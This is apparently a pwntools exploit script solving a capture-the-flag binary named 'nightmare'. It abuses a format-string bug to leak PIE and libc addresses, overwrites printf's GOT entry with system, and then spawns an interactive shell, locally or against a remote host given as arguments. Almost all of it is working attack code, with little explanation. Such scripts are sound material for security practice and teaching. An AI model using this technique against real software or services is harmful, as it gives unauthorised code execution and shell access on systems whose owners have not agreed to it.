from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
piebase
breakrva 0x138c
continue
'''.format(**locals())

exe = './nightmare'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

sh = start()

'''
for i in range(100):
    try:
        #sh = process()
        sh.sendlineafter(b'>', b'1')
        sh.recvuntil(b'>')
        print("Iter {}:".format(i))
        sh.sendline('%{}$p'.format(i))
        sh.recvuntil(b'> ')
        get = sh.recvlineS()
        print(get)
        #sh.close()
    except EOFError:
        pass
'''

## 1st method to leak the pie_base and libc_system_address

'''
sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%23$p')
sh.recvuntil(b'>')
get_leak_pie = sh.recvlineS()
leak = int(get_leak_pie, 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', '%26$p')
sh.recvuntil(b'>')
get_leak_libc_system = sh.recvlineS()
leaked_libc_system = int(get_leak_libc_system, 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)
'''

## 2nd method use (since we want to get the offset automatically)
## REFERENCE --> https://docs.pwntools.com/en/stable/fmtstr.html

# option local

def send_payload(payload): # can determine the correct offset and send our payload auto.
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b'>', payload)
    sh.recvuntil(b'> ')
    return sh.recvline().strip() # cannot using recvlineS() dunno why..

format_str = FmtStr(execute_fmt=send_payload)

leak = int(send_payload('%23$p'), 16)
log.success('Leaked pie --> %#0x', leak)

pie_base = leak - 13792
log.info('This is the actual pie_base --> %#0x', pie_base)

leaked_libc_system = int(send_payload('%26$p'), 16)
log.success('Leaked libc system address --> %#0x', leaked_libc_system)

libc_system_binary = leaked_libc_system - 1599312
log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)

libc_base = libc_system_binary - 0x4c330 
log.info('This is the libc_base --> %#0x', libc_base)

binsh = libc_base + 0x196031
log.info('This is the binsh strings address --> %#0x', binsh)

## REMEMBERING PIE ENABLED, actually need to elf.address = pie_base (for best practice)
printf_got_addr = pie_base + elf.got['printf']
log.info('This is the printf@got addr --> %#0x', printf_got_addr)

## OVERWRITING "printf" with "system" using FmtStr
format_str = FmtStr(execute_fmt=send_payload)
format_str.write(printf_got_addr, libc_system_binary)

format_str.execute_writes() # perform the writes

sh.sendline(b'2') # go to second menu
sh.sendline(b'sh') # run shell # can't /bin/sh\x00

sh.interactive()
